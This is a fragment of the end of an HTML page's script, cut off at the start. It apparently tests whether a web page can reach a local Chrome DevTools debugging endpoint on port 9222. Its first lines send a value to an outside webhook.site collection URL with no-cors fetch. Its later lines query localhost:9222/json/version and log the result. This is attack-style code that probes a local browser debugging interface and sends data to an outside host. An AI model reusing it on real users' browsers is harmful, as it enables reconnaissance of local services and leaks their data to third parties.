            fetch("https://webhook.site/96a9c841-170a-46a1-aca9-db43dee912a8", {

                mode: "no-cors",
                body: String(x)

        (async () => {
            out.textContent = "";
            try {
                const r = await fetch("http://localhost:9222/json/version");
                log("DevTools HTTP status: " + r.status);
                log(await r.text());
            } catch (e) {
                log("DevTools fetch failed: " + e);
            }
        })();
    </script>
</body>
